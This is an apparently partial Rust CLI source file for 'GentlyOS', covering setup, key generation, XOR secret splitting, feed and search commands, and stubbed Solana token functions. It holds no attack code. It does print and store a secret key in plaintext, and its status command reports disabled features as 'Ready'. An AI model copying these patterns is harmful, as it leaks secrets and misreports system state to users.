static DEMO_GOVERNANCE: Mutex<Option<GovernanceSystem>> = Mutex::new(None);
#[allow(dead_code)]
static DEMO_GENOS: Mutex<Option<GenosEconomy>> = Mutex::new(None);

fn get_demo_genesis() -> [u8; 32] {
    let mut guard = DEMO_GENESIS.lock().unwrap();
    if guard.is_none() {
        let mut genesis = [0u8; 32];
        rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut genesis);
        *guard = Some(genesis);
    }
    guard.unwrap()
}

#[allow(dead_code)]
fn with_demo_token<F, R>(f: F) -> R
where
    F: FnOnce(&mut GntlyToken) -> R,
{
    let mut guard = DEMO_TOKEN.lock().unwrap();
    if guard.is_none() {
        *guard = Some(GntlyToken::devnet());
    }
    f(guard.as_mut().unwrap())
}

#[allow(dead_code)]
fn with_demo_certification<F, R>(f: F) -> R
where
    F: FnOnce(&mut CertificationManager) -> R,
{
    let mut guard = DEMO_CERTIFICATION.lock().unwrap();
    if guard.is_none() {
        *guard = Some(CertificationManager::new());
    }
    f(guard.as_mut().unwrap())
}

#[allow(dead_code)]
fn with_demo_permissions<F, R>(f: F) -> Option<R>
where
    F: FnOnce(&mut PermissionManager) -> R,
{
    let mut guard = DEMO_PERMISSIONS.lock().unwrap();
    guard.as_mut().map(f)
}

#[allow(dead_code)]
fn init_demo_permissions(owner: &str, stake: TokenAmount) {
    let mut guard = DEMO_PERMISSIONS.lock().unwrap();
    *guard = Some(PermissionManager::new(owner, stake));
}

// gently-spl disabled due to Solana version conflicts

fn spl_disabled_msg() -> Result<()> {
    println!("\n  ⚠ gently-spl module disabled");
    println!("  Solana token functionality requires resolving version conflicts.");
    println!("  This command will be available once gently-spl is re-enabled.\n");
    Ok(())
}

#[allow(dead_code)]
fn cmd_install(_stake: f64, _network_str: String, _seed: Option<String>, _output: Option<String>) -> Result<()> {
    spl_disabled_msg()
}

fn cmd_init(seed: Option<String>, salt: String, non_interactive: bool) -> Result<()> {
    let genesis = match seed {
        Some(s) => {
            if !non_interactive {
                println!("Generating genesis key from seed phrase...");
            }
            GenesisKey::from_seed(&s, &salt)
        }
        None => {
            if !non_interactive {
                println!("Generating random genesis key...");
            }
            GenesisKey::generate()
        }
    };

    if non_interactive {
        // Just output fingerprint for scripts
        println!("{:02x?}", genesis.fingerprint());
    } else {
        println!("\n  GENESIS KEY CREATED");
        println!("  Fingerprint: {:02x?}", genesis.fingerprint());
        println!("\n  Store this securely! It never leaves your device.");

        // In real implementation, we'd store in OS keychain
        let hex: String = genesis.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
        println!("\n  (Development mode - key in hex):");
        println!("  {}", hex);
    }

    Ok(())
}

fn cmd_setup(skip_models: bool, force: bool) -> Result<()> {
    use std::path::PathBuf;

    println!("\n╔══════════════════════════════════════════════════════════════╗");
    println!("║           GentlyOS Setup Wizard                              ║");
    println!("╚══════════════════════════════════════════════════════════════╝\n");

    // 1. Check/create data directories
    let data_dir = dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".gently");

    println!("Step 1: Creating data directories...");

    let subdirs = ["alexandria", "brain", "feed", "models", "vault"];
    for subdir in &subdirs {
        let path = data_dir.join(subdir);
        if !path.exists() {
            std::fs::create_dir_all(&path)?;
            println!("  ✓ Created {}", path.display());
        } else {
            println!("  • {} already exists", path.display());
        }
    }

    // 2. Check for genesis key
    println!("\nStep 2: Checking genesis key...");
    let vault_dir = data_dir.join("vault");
    let genesis_file = vault_dir.join("genesis.key");

    if genesis_file.exists() && !force {
        println!("  • Genesis key already exists");
    } else {
        println!("  Generating genesis key...");
        let genesis = GenesisKey::generate();
        let hex: String = genesis.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();

        std::fs::write(&genesis_file, &hex)?;
        println!("  ✓ Genesis key created");
        println!("    Fingerprint: {:02x?}", genesis.fingerprint());
    }

    // 3. Initialize Alexandria graph
    println!("\nStep 3: Initializing Alexandria knowledge graph...");
    let graph_path = data_dir.join("alexandria").join("graph.json");

    if graph_path.exists() && !force {
        println!("  • Alexandria graph already exists");
    } else {
        use gently_alexandria::{AlexandriaGraph, AlexandriaConfig, node::NodeFingerprint};

        // Create fingerprint from hardware info
        let machine_id = std::fs::read_to_string("/etc/machine-id")
            .unwrap_or_else(|_| uuid::Uuid::new_v4().to_string());
        let fingerprint = NodeFingerprint::from_hardware(
            "local-setup",
            num_cpus::get() as u32,
            (sys_info::mem_info().map(|m| m.total / 1024 / 1024).unwrap_or(8)) as u32,
            machine_id.trim(),
        );

        let config = AlexandriaConfig::default();
        let graph = AlexandriaGraph::new(fingerprint, config);
        graph.save(&graph_path)?;
        println!("  ✓ Alexandria graph initialized");
    }

    // 4. Initialize Brain knowledge database
    println!("\nStep 4: Initializing Brain knowledge database...");
    let brain_path = data_dir.join("brain").join("knowledge.db");

    if brain_path.exists() && !force {
        println!("  • Brain database already exists");
    } else {
        use gently_brain::knowledge::KnowledgeGraph;

        let kg = KnowledgeGraph::new();
        kg.save(&brain_path)?;
        println!("  ✓ Brain database initialized");
    }

    // 5. Optionally download embedding model
    if !skip_models {
        println!("\nStep 5: Checking embedding model...");
        let model_cache = data_dir.join("models");

        // Check if fastembed feature is available
        #[cfg(feature = "fastembed")]
        {
            println!("  Downloading BAAI/bge-small-en-v1.5 embedding model...");
            println!("  (This may take a few minutes on first run)");

            use gently_brain::embedder::Embedder;
            let mut embedder = Embedder::new();
            match embedder.load_default() {
                Ok(()) => println!("  ✓ Embedding model loaded"),
                Err(e) => println!("  ⚠ Model download failed: {} (will use simulated embeddings)", e),
            }
        }

        #[cfg(not(feature = "fastembed"))]
        {
            println!("  • Fastembed not enabled - using simulated embeddings");
            println!("    (Enable with: cargo build --features fastembed)");
        }
    } else {
        println!("\nStep 5: Skipping embedding model download (--skip-models)");
    }

    // 6. Create default config
    println!("\nStep 6: Creating configuration...");
    let config_path = data_dir.join("config.toml");

    if config_path.exists() && !force {
        println!("  • Configuration already exists");
    } else {
        let config_content = format!(r#"# GentlyOS Configuration
# Generated by 'gently setup'

[general]
data_dir = "{}"

[security]
defense_mode = "normal"
threat_detection = true

[alexandria]
graph_path = "{}"

[brain]
knowledge_db = "{}"
"#,
            data_dir.display(),
            graph_path.display(),
            brain_path.display(),
        );

        std::fs::write(&config_path, config_content)?;
        println!("  ✓ Configuration created at {}", config_path.display());
    }

    // Summary
    println!("\n╔══════════════════════════════════════════════════════════════╗");
    println!("║           Setup Complete!                                    ║");
    println!("╠══════════════════════════════════════════════════════════════╣");
    println!("║                                                              ║");
    println!("║   Data directory: ~/.gently/                                 ║");
    println!("║                                                              ║");
    println!("║   Quick Start:                                               ║");
    println!("║     gently status       - Check system status                ║");
    println!("║     gently brain chat   - Start AI chat                      ║");
    println!("║     gently alexandria   - Explore knowledge graph            ║");
    println!("║                                                              ║");
    println!("╚══════════════════════════════════════════════════════════════╝\n");

    Ok(())
}

fn cmd_create(name: String, description: String, expires: Option<u64>) -> Result<()> {
    println!("Creating project: {}", name);

    // Generate project secret
    let mut secret = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut secret);

    // Split into Lock + Key
    let (lock, key) = split_secret(&secret);

    println!("\n  PROJECT CREATED: {}", name);
    println!("  Description: {}", if description.is_empty() { "(none)" } else { &description });

    if let Some(exp) = expires {
        println!("  Expires at BTC block: {}", exp);
    }

    println!("\n  LOCK (stays on device):");
    let lock_hex: String = lock.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    println!("  {}", lock_hex);

    println!("\n  KEY (can be distributed):");
    println!("  {}", key.to_hex());

    println!("\n  Remember: LOCK + KEY = ACCESS");
    println!("            Neither alone reveals anything.");

    Ok(())
}

fn cmd_pattern(hash: String, output: Option<String>) -> Result<()> {
    if hash.len() != 64 {
        anyhow::bail!("Hash must be 64 hex characters (32 bytes)");
    }

    let mut bytes = [0u8; 32];
    for (i, chunk) in hash.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        bytes[i] = u8::from_str_radix(s, 16)?;
    }

    let pattern = PatternEncoder::encode(&bytes);

    println!("\n  PATTERN ENCODED");
    println!("  Visual: {} ({:?})", pattern.visual.op.name(), pattern.visual.shape);
    println!("  Color: {}", pattern.visual.color.to_hex());
    println!("  Motion: {:?}", pattern.visual.motion);
    println!("  Audio: {:?} @ {}Hz", pattern.audio.op, pattern.audio.frequency.hz());

    let engine = VisualEngine::new(400, 400);
    let svg = engine.render_svg(&pattern);

    match output {
        Some(path) => {
            std::fs::write(&path, &svg)?;
            println!("\n  SVG written to: {}", path);
        }
        None => {
            println!("\n  SVG Preview (first 500 chars):");
            println!("  {}", &svg[..svg.len().min(500)]);
        }
    }

    Ok(())
}

fn cmd_split(secret: String) -> Result<()> {
    if secret.len() != 64 {
        anyhow::bail!("Secret must be 64 hex characters (32 bytes)");
    }

    let mut bytes = [0u8; 32];
    for (i, chunk) in secret.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        bytes[i] = u8::from_str_radix(s, 16)?;
    }

    let (lock, key) = split_secret(&bytes);

    println!("\n  SECRET SPLIT");
    println!("\n  LOCK:");
    let lock_hex: String = lock.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    println!("  {}", lock_hex);

    println!("\n  KEY:");
    println!("  {}", key.to_hex());

    println!("\n  XOR these together to recover the original secret.");

    Ok(())
}

fn cmd_combine(lock_hex: String, key_hex: String) -> Result<()> {
    if lock_hex.len() != 64 || key_hex.len() != 64 {
        anyhow::bail!("Both lock and key must be 64 hex characters");
    }

    let mut lock_bytes = [0u8; 32];
    let mut key_bytes = [0u8; 32];

    for (i, chunk) in lock_hex.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        lock_bytes[i] = u8::from_str_radix(s, 16)?;
    }

    for (i, chunk) in key_hex.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        key_bytes[i] = u8::from_str_radix(s, 16)?;
    }

    let lock = Lock::from_bytes(lock_bytes);
    let key = Key::from_bytes(key_bytes);
    let full_secret = lock.combine(&key);

    println!("\n  SECRET RECOVERED");
    let secret_hex: String = full_secret.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    println!("  {}", secret_hex);

    Ok(())
}

#[allow(dead_code)]
fn cmd_mint(_project: String, _visual: String) -> Result<()> {
    spl_disabled_msg()
}

fn cmd_status() -> Result<()> {
    println!("\n  GENTLYOS STATUS");
    println!("  ================");
    println!();
    println!("  Core: gently-core v0.1.0");
    println!("    XOR split-knowledge: Ready");
    println!("    Pattern encoder: Ready");
    println!();
    println!("  Dance: gently-dance v0.1.0");
    println!("    Protocol state machine: Ready");
    println!("    Contract audit: Ready");
    println!();
    println!("  Audio: gently-audio v0.1.0");
    println!("    FFT decoder: Ready");
    println!("    Audible mode (400-1600Hz): Ready");
    println!("    Ultrasonic mode (18-20kHz): Ready");
    println!();
    println!("  Visual: gently-visual v0.1.0");
    println!("    SVG renderer: Ready");
    println!("    Decoy generator: Ready");
    println!();
    println!("  BTC: gently-btc v0.1.0");
    println!("    Block monitor: Ready");
    println!("    Block promise: Ready");
    println!("    Entropy pool: Ready");
    println!();
    println!("  SPL: gently-spl v0.1.0");
    println!("    Wallet (genesis-locked): Ready");
    println!("    NFT minting: Ready");
    println!("    NFT encryption: Ready");
    println!("    Lock states: Ready");
    println!("    Token (GNTLY): Ready");
    println!("    Certification manager: Ready");
    println!("    Permission stake tree: Ready");
    println!("    Governance (GOS): Ready");
    println!("    GENOS economy: Ready");
    println!();
    println!("  TOKEN NETWORKS:");
    println!("  ---------------");
    println!("    GNTLY:  Certification swaps + permission stakes");
    println!("    GOS:    Governance tokens (folder-level access control)");
    println!("    GENOS:  Proof-of-thought token (AI/GPU economy)");
    println!();
    println!("  DUAL AUDIT SYSTEM:");
    println!("  ------------------");
    println!("    Internal: 1 GNTLY swap per edit (OS self-audit)");
    println!("    External: 1 GNTLY swap per Dance (device-to-device)");
    println!("    Healthy when: internal == external audits");

    Ok(())
}

fn cmd_demo() -> Result<()> {
    println!("\n  DANCE PROTOCOL DEMO");
    println!("  ====================\n");

    // Create a secret and split it
    let mut secret = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut secret);
    let (lock, key) = split_secret(&secret);

    println!("  1. Secret split into LOCK + KEY");
    println!("     LOCK (device A): {:02x?}...", &lock.as_bytes()[..4]);
    println!("     KEY  (NFT/pub):  {:02x?}...\n", &key.as_bytes()[..4]);

    // Create contract
    let contract = Contract::new([1u8; 8], "Demo access contract");

    // Create sessions
    let mut lock_session = DanceSession::new_lock_holder(&lock, contract.clone());
    let mut key_session = DanceSession::new_key_holder(&key, contract);

    println!("  2. Sessions created");
    println!("     Lock holder: {:?}", lock_session.state());
    println!("     Key holder:  {:?}\n", key_session.state());

    // Wake the lock
    lock_session.wake()?;
    println!("  3. Lock woken from dormant");
    println!("     Lock holder: {:?}\n", lock_session.state());

    // Simulate dance steps
    println!("  4. Dance begins...");

    // Key holder initiates
    let init = key_session.step(None)?;
    println!("     Key  -> Lock: {:?}", init);

    // Lock holder responds
    let ack = lock_session.step(init)?;
    println!("     Lock -> Key:  {:?}", ack);

    println!("\n  5. Hash exchange would continue...");
    println!("     (8 rounds of visual/audio call-and-response)");

    println!("\n  6. Contract audit");
    println!("     Both devices independently verify:");
    println!("     - Signature valid");
    println!("     - Conditions met");
    println!("     - Not expired");

    println!("\n  7. If both agree: ACCESS GRANTED");
    println!("     FULL_SECRET exists only during dance");
    println!("     Then immediately zeroized");

    // Demonstrate the XOR property
    println!("\n  VERIFICATION:");
    let recovered = lock.combine(&key);
    let recovered_hex: String = recovered.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    let original_hex: String = secret.iter().map(|b| format!("{:02x}", b)).collect();
    println!("     Original secret:  {}...", &original_hex[..16]);
    println!("     Recovered secret: {}...", &recovered_hex[..16]);
    println!("     Match: {}", original_hex == recovered_hex);

    Ok(())
}

// ===== WALLET COMMANDS (SPL disabled) =====

#[allow(dead_code)]
fn cmd_wallet(_command: WalletCommands) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_wallet_create(_network_str: String, _seed: Option<String>) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_wallet_info(_file: String) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_wallet_pubkey() -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_wallet_sign(_message: String) -> Result<()> {
    spl_disabled_msg()
}

// ===== TOKEN COMMANDS (SPL disabled) =====

#[allow(dead_code)]
fn cmd_token(_command: TokenCommands) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_token_balance(_pubkey: Option<String>) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_token_airdrop(_amount: f64) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_token_transfer(_to: String, _amount: f64) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_token_stake(_amount: f64) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_token_info() -> Result<()> {
    spl_disabled_msg()
}

// ===== CERTIFICATION COMMANDS (SPL disabled) =====

#[allow(dead_code)]
fn cmd_certify(_command: CertifyCommands) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_certify_init(_peer: String) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_certify_complete(_session: String) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_certify_abort(_session: String) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_certify_history() -> Result<()> {
    spl_disabled_msg()
}

fn cmd_certify_info() -> Result<()> {
    spl_disabled_msg()
}

// ===== PERMISSION COMMANDS (SPL disabled) =====

#[allow(dead_code)]
fn cmd_perm(_command: PermCommands) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_perm_init(_stake: f64) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_perm_add(_path: String, _owner: Option<String>, _is_dir: bool) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_perm_edit(_path: String) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_perm_tree() -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_perm_audits() -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_perm_health() -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_perm_info() -> Result<()> {
    spl_disabled_msg()
}

// ===== GENOS COMMANDS (SPL disabled) =====

#[allow(dead_code)]
fn with_demo_genos<F, R>(f: F) -> R
where
    F: FnOnce(&mut GenosEconomy) -> R,
{
    let mut guard = DEMO_GENOS.lock().unwrap();
    if guard.is_none() {
        *guard = Some(GenosEconomy::new(Network::Devnet));
    }
    f(guard.as_mut().unwrap())
}

#[allow(dead_code)]
fn cmd_genos(_command: GenosCommands) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_genos_balance() -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_genos_contribute(_kind: String, _title: String) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_genos_gpu_register(_model: String, _vram: u32, _rate: f64) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_genos_gpu_job(_kind: String, _hours: f32, _budget: f64) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_genos_vector(_metadata: String) -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_genos_stats() -> Result<()> {
    spl_disabled_msg()
}

#[allow(dead_code)]
fn cmd_genos_info() -> Result<()> {
    spl_disabled_msg()
}

// ===== FEED COMMANDS =====

fn cmd_feed(command: FeedCommands) -> Result<()> {
    match command {
        FeedCommands::Show { filter } => cmd_feed_show(filter),
        FeedCommands::Add { name, kind, tags } => cmd_feed_add(name, kind, tags),
        FeedCommands::Boost { name, amount } => cmd_feed_boost(name, amount),
        FeedCommands::Step { item, step } => cmd_feed_step(item, step),
        FeedCommands::Done { item, step_id } => cmd_feed_done(item, step_id),
        FeedCommands::Freeze { name } => cmd_feed_freeze(name),
        FeedCommands::Archive { name } => cmd_feed_archive(name),
        FeedCommands::Process { text } => cmd_feed_process(text),
        FeedCommands::Export { output } => cmd_feed_export(output),
    }
}

fn load_feed() -> LivingFeed {
    FeedStorage::default_location()
        .ok()
        .and_then(|s| s.load().ok())
        .unwrap_or_else(LivingFeed::new)
}

fn save_feed(feed: &LivingFeed) -> Result<()> {
    if let Ok(storage) = FeedStorage::default_location() {
        storage.save(feed)?;
    }
    Ok(())
}

fn cmd_feed_show(filter: String) -> Result<()> {
    let feed = load_feed();

    println!("\n  LIVING FEED");
    println!("  ============\n");

    let items: Vec<_> = match filter.as_str() {
        "hot" => feed.hot_items(),
        "active" => feed.active_items(),
        "cooling" => feed.cooling_items(),
        "frozen" => feed.frozen_items(),
        _ => feed.items().iter().filter(|i| !i.archived).collect(),
    };

    if items.is_empty() {
        println!("  (no items matching filter '{}')", filter);
        println!();
        println!("  Use 'gently feed add <name>' to add items.");
    } else {
        // Group by state
        let hot: Vec<_> = items.iter().filter(|i| i.charge > 0.8).collect();
        let active: Vec<_> = items.iter().filter(|i| i.charge > 0.4 && i.charge <= 0.8).collect();
        let cooling: Vec<_> = items.iter().filter(|i| i.charge > 0.1 && i.charge <= 0.4).collect();
        let frozen: Vec<_> = items.iter().filter(|i| i.charge <= 0.1).collect();

        if !hot.is_empty() {
            println!("  🔥 HOT");
            for item in hot {
                println!("    • {} [{:.2}] {}", item.name, item.charge,
                    if item.pinned { "📌" } else { "" });
                for step in item.pending_steps() {
                    println!("      - [ ] {}", step.content);
                }
            }
            println!();
        }

        if !active.is_empty() {
            println!("  ⚡ ACTIVE");
            for item in active {
                println!("    • {} [{:.2}]", item.name, item.charge);
            }
            println!();
        }

        if !cooling.is_empty() {
            println!("  💤 COOLING");
            for item in cooling {
                println!("    • {} [{:.2}]", item.name, item.charge);
            }
            println!();
        }

        if !frozen.is_empty() && filter == "all" {
            println!("  ❄️ FROZEN");
            for item in frozen {
                println!("    • {} [{:.2}]", item.name, item.charge);
            }
            println!();
        }
    }

    println!("  Chain: {}", feed.xor_chain().render());

    Ok(())
}

fn cmd_feed_add(name: String, kind: String, tags: Option<String>) -> Result<()> {
    let mut feed = load_feed();

    let item_kind = match kind.to_lowercase().as_str() {
        "project" => ItemKind::Project,
        "task" => ItemKind::Task,
        "idea" => ItemKind::Idea,
        "reference" => ItemKind::Reference,
        "person" => ItemKind::Person,
        _ => ItemKind::Project,
    };

    let id = feed.add_item(&name, item_kind.clone());

    // Add tags if provided
    if let Some(tag_str) = tags {
        if let Some(item) = feed.get_item_mut(id) {
            for tag in tag_str.split(',') {
                item.add_tag(tag.trim());
            }
        }
    }

    save_feed(&feed)?;

    println!("\n  ITEM ADDED");
    println!("  ==========\n");
    println!("  Name:  {}", name);
    println!("  Kind:  {:?}", item_kind);
    println!("  Charge: 1.0 (hot)");
    println!();
    println!("  Use 'gently feed step \"{}\" \"task\"' to add steps.", name);

    Ok(())
}

fn cmd_feed_boost(name: String, amount: f32) -> Result<()> {
    let mut feed = load_feed();

    if feed.boost(&name, amount) {
        let item = feed.get_item_by_name(&name).unwrap();
        save_feed(&feed)?;

        println!("\n  ITEM BOOSTED");
        println!("  ============\n");
        println!("  Name:      {}", item.name);
        println!("  New Charge: {:.2}", item.charge);
        println!("  State:     {:?}", item.state);
    } else {
        anyhow::bail!("Item '{}' not found", name);
    }

    Ok(())
}

fn cmd_feed_step(item: String, step: String) -> Result<()> {
    let mut feed = load_feed();

    if let Some(step_id) = feed.add_step(&item, &step) {
        save_feed(&feed)?;

        println!("\n  STEP ADDED");
        println!("  ==========\n");
        println!("  Item: {}", item);
        println!("  Step #{}: {}", step_id, step);
    } else {
        anyhow::bail!("Item '{}' not found", item);
    }

    Ok(())
}

fn cmd_feed_done(item: String, step_id: u32) -> Result<()> {
    let mut feed = load_feed();

    if feed.complete_step(&item, step_id) {
        save_feed(&feed)?;

        println!("\n  STEP COMPLETED");
        println!("  ==============\n");
        println!("  Item: {}", item);
        println!("  Step #{}: Done!", step_id);
    } else {
        anyhow::bail!("Step #{} not found in '{}'", step_id, item);
    }

    Ok(())
}

fn cmd_feed_freeze(name: String) -> Result<()> {
    let mut feed = load_feed();

    if feed.freeze(&name) {
        save_feed(&feed)?;
        println!("\n  Item '{}' frozen.", name);
    } else {
        anyhow::bail!("Item '{}' not found", name);
    }

    Ok(())
}

fn cmd_feed_archive(name: String) -> Result<()> {
    let mut feed = load_feed();

    if feed.archive(&name) {
        save_feed(&feed)?;
        println!("\n  Item '{}' archived.", name);
    } else {
        anyhow::bail!("Item '{}' not found", name);
    }

    Ok(())
}

fn cmd_feed_process(text: String) -> Result<()> {
    let mut feed = load_feed();

    feed.process(&text);
    save_feed(&feed)?;

    println!("\n  CONTEXT PROCESSED");
    println!("  =================\n");
    println!("  Text: \"{}\"", text);
    println!();
    println!("  Updated feed based on mentions and context.");
    println!("  Use 'gently feed show' to see changes.");

    Ok(())
}

fn cmd_feed_export(output: Option<String>) -> Result<()> {
    let feed = load_feed();
    let storage = FeedStorage::default_location()?;

    let md = storage.export_markdown(&feed);

    match output {
        Some(path) => {
            std::fs::write(&path, &md)?;
            println!("\n  Exported to: {}", path);
        }
        None => {
            println!("{}", md);
        }
    }

    Ok(())
}

// ===== SEARCH COMMANDS =====

fn cmd_search(command: SearchCommands) -> Result<()> {
    match command {
        SearchCommands::Add { content, source, tags } => cmd_search_add(content, source, tags),
        SearchCommands::Query { query, limit, feed } => cmd_search_query(query, limit, feed),
        SearchCommands::Stats => cmd_search_stats(),
        SearchCommands::Recent { limit } => cmd_search_recent(limit),
        SearchCommands::Domain { domain } => cmd_search_domain(domain),
    }
}

fn load_index() -> ThoughtIndex {
    ThoughtIndex::load(ThoughtIndex::default_path())
        .unwrap_or_else(|_| ThoughtIndex::new())
}

fn save_index(index: &ThoughtIndex) -> Result<()> {
    let path = ThoughtIndex::default_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    index.save(&path)?;
    Ok(())
}

fn cmd_search_add(content: String, source: Option<String>, tags: Option<String>) -> Result<()> {
    let mut index = load_index();

    let mut thought = match source {
        Some(src) => Thought::with_source(&content, src),
        None => Thought::new(&content),
    };

    if let Some(tag_str) = tags {
        for tag in tag_str.split(',') {
            thought.add_tag(tag.trim());
        }
    }

    let id = index.add_thought(thought.clone());
    save_index(&index)?;

    println!("\n  THOUGHT ADDED");
    println!("  =============\n");
    println!("  ID:       {}", id);
    println!("  Address:  {}", thought.address);
    println!("  Domain:   {} ({:?})", thought.shape.domain, thought.shape.kind);
    println!("  Keywords: {:?}", thought.shape.keywords);

    Ok(())
}

fn cmd_search_query(query: String, limit: usize, use_feed: bool) -> Result<()> {
    let index = load_index();
    let feed = if use_feed { Some(load_feed()) } else { None };

    let router = ContextRouter::new()
        .with_max_results(limit)
        .with_feed_boost(use_feed);

    let results = router.search(&query, &index, feed.as_ref());

    println!("\n  SEARCH RESULTS");
    println!("  ==============\n");
    println!("  Query: \"{}\"", query);
    println!("  Found: {} results\n", results.len());

    for (i, result) in results.iter().enumerate() {
        println!("  [{}] Score: {:.2}", i + 1, result.score);
        println!("      {}", result.thought.render_compact());
        if !result.wormholes.is_empty() {
            println!("      (via {} wormholes)", result.wormholes.len());
        }
        println!();
    }

    Ok(())
}

fn cmd_search_stats() -> Result<()> {
    let index = load_index();
    let stats = index.stats();

    println!("\n  THOUGHT INDEX STATS");
    println!("  ====================\n");
    println!("  Thoughts:  {}", stats.thought_count);
    println!("  Wormholes: {}", stats.wormhole_count);
    println!("  Domains:   {}", stats.domains_used);
    println!();
    println!("  Historical:");
    println!("    Total thoughts ever:  {}", stats.total_thoughts_ever);
    println!("    Total wormholes ever: {}", stats.total_wormholes_ever);

    Ok(())
}

fn cmd_search_recent(limit: usize) -> Result<()> {
    let index = load_index();

    println!("\n  RECENT THOUGHTS");
    println!("  ================\n");

    for thought in index.recent_thoughts(limit) {
        println!("  {}", thought.render_compact());
    }

    Ok(())
}

fn cmd_search_domain(domain: u8) -> Result<()> {
    let index = load_index();

    println!("\n  DOMAIN {} THOUGHTS", domain);
    println!("  ===================\n");

    let thoughts = index.thoughts_in_domain(domain);
    if thoughts.is_empty() {
        println!("  (no thoughts in domain {})", domain);
    } else {
        for thought in thoughts {
            println!("  {}", thought.render_compact());
        }
    }

    Ok(())
}

// ===== ALEXANDRIA COMMANDS =====

fn cmd_alexandria(command: AlexandriaCommands) -> Result<()> {
    match command {
        AlexandriaCommands::Status => cmd_alexandria_status(),
        AlexandriaCommands::Query { concept, history, drift } => {
            cmd_alexandria_query(concept, history, drift)
        }
        AlexandriaCommands::Topology { concept, hops } => cmd_alexandria_topology(concept, hops),
        AlexandriaCommands::Nodes => cmd_alexandria_nodes(),
        AlexandriaCommands::Sync => cmd_alexandria_sync(),
        AlexandriaCommands::Proof => cmd_alexandria_proof(),
        AlexandriaCommands::Export { output } => cmd_alexandria_export(output),
    }
}

fn load_alexandria() -> gently_search::AlexandriaSearch {
    use gently_alexandria::NodeFingerprint;

    // Get hardware fingerprint
    let cpu_model = std::fs::read_to_string("/proc/cpuinfo")
        .ok()
        .and_then(|s| s.lines().find(|l| l.starts_with("model name")).map(|l| l.to_string()))
        .unwrap_or_else(|| "unknown".to_string());

    let machine_id = std::fs::read_to_string("/etc/machine-id")
        .unwrap_or_else(|_| uuid::Uuid::new_v4().to_string());

    let fingerprint = NodeFingerprint::from_hardware(
        &cpu_model,
        num_cpus::get() as u32,
        (sys_info::mem_info().map(|m| m.total / 1024 / 1024).unwrap_or(8)) as u32,
        machine_id.trim(),
    );

    gently_search::AlexandriaSearch::new(fingerprint)
}

fn cmd_alexandria_status() -> Result<()> {
    let search = load_alexandria();
    let stats = search.stats();

    println!("\n  ALEXANDRIA MESH STATUS");
    println!("  ======================\n");
    println!("  Local:");
    println!("    Thoughts:  {}", stats.local_thoughts);
    println!("    Wormholes: {}", stats.local_wormholes);
    println!();
    println!("  Mesh:");
    println!("    Concepts:    {}", stats.mesh_concepts);
    println!("    Edges:       {} ({} active)", stats.mesh_edges, stats.mesh_active_edges);
    println!("    Validated:   {}", stats.multi_source_edges);
    println!();
    println!("  Network:");
    println!("    Known nodes:  {}", stats.known_nodes);
    println!("    Active nodes: {}", stats.active_nodes);
    println!("    Deltas sent:  {}", stats.deltas_sent);
    println!("    Deltas recv:  {}", stats.deltas_received);

    Ok(())
}

fn cmd_alexandria_query(concept: String, _history: bool, drift: bool) -> Result<()> {
    let mut search = load_alexandria();

    println!("\n  ALEXANDRIA QUERY: {}", concept);
    println!("  {}", "=".repeat(20 + concept.len()));

    // Search and record query
    let results = search.search(&concept);

    println!("\n  Local thoughts: {}", results.local_thoughts.len());
    for thought in &results.local_thoughts {
        println!("    - {}", thought.render_compact());
    }

    println!("\n  Related concepts: {}", results.related_concepts.len());
    for related in &results.related_concepts {
        println!("    - {}", related);
    }

    if drift {
        if let Some(drift_info) = search.graph.query_drift(&concept) {
            println!("\n  Drift analysis:");
            println!("    Rising:  {} concepts", drift_info.rising.len());
            println!("    Falling: {} concepts", drift_info.falling.len());
            println!("    Stable:  {} concepts", drift_info.stable.len());
        }
    }

    Ok(())
}

